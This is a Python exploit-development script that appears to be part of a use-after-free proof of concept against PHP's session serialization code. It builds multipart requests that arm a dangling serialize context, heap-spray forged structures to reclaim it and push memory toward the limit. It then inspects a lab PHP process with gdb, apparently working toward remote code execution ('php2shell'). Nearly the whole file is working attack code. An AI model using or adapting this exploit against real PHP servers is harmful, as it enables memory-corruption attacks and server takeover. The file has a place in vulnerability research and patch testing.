#!/usr/bin/env python3
"""press.py - spray + pressure in one request.

The request after an arm crashes in php_session_flush -> session_adapt_url
because the 64-byte serialize context is dangling; t[] spray values (24-byte
body -> 49-byte alloc, same 64-byte bin) reclaim it. The filler then starves
memory so the END decode can cross memory_limit with spray already in place.

Usage: python3 press.py --t 300 --fill 600 --spray 60
"""
import argparse
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
MAL = "/ndary=UctxPoc2026"
LAB = "/tmp/php2shell_ap"


def body(sid, spray, ctx, n_t, n_fill, fill_size=4000):
    out = bytearray()
    out += P.mp_part(BND, b"PHPSESSID", sid.encode())
    out += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(spray):
        out += P.mp_part(BND, b"s[]", ctx)
    small = __import__("struct").pack("<QII", P.MARKER, 8, 0) + b"\x00" * 8
    for _ in range(n_t):
        out += P.mp_part(BND, b"t[]", small)
    for _ in range(n_fill):
        out += P.mp_part(BND, b"fill[]", b"P" * fill_size)
    out += b"--" + BND + b"--\r\n"
    return bytes(out)


def levels(pid):
    out = subprocess.run(["sudo", "gdb", "-q", "-p", str(pid), "-batch", "-x", "/tmp/bgchk.gdb"],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        if "SER_LEVEL=" in line:
            return line.split("SER_LEVEL=")[1].split()[0], line.split("UNSER_LEVEL=")[1].split()[0]
    return "?", "?"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--t", type=int, default=300)
    ap.add_argument("--fill", type=int, default=600)
    ap.add_argument("--spray", type=int, default=60)
    ap.add_argument("--fill-size", type=int, default=4000)
    a = ap.parse_args()

    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    parent = int(out.split("parent=")[1].split()[0])
    child = int(out.split("child=")[1].split()[0])
    sid = "pr%d-%d-%d-abc" % (a.t, a.fill, a.spray)

    st, _d, _ = P.send(URL, P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)
    src = "%s/sess_%s" % (LAB + "/sess", sid)
    subprocess.run(["sudo", "cp", src, "%s/sess_%s" % (MAL, sid)], check=False)
    subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (MAL, sid)], check=False)
    tree = os.path.getsize(src) if os.path.exists(src) else -1

    before = len(open(LAB + "/error.log", errors="replace").read())
    ctx = P.forge_ctx(P.MARKER, P.MARKER, used=1018, data0=0x4242424242424242)
    st2, d2, _ = P.send(URL, body(sid, a.spray, ctx, a.t, a.fill, a.fill_size), BND, sid, 0, 0)
    log = open(LAB + "/error.log", errors="replace").read()[before:]
    alloc = re.findall(r"tried to allocate (\d+)", log)
    dead = not os.path.exists("/proc/%d" % child)
    ser, unser = levels(child) if not dead else ("-", "-")
    dev = d2.count(b"4183")
    print("arm=%s tree=%d t=%d fill=%d(fs%d) spray=%d -> %s alloc=%s dead=%s SER=%s UNSER=%s "
          % (st, tree, a.t, a.fill, a.fill_size, a.spray, st2, alloc[:2], dead, ser, unser))


if __name__ == "__main__":
    main()
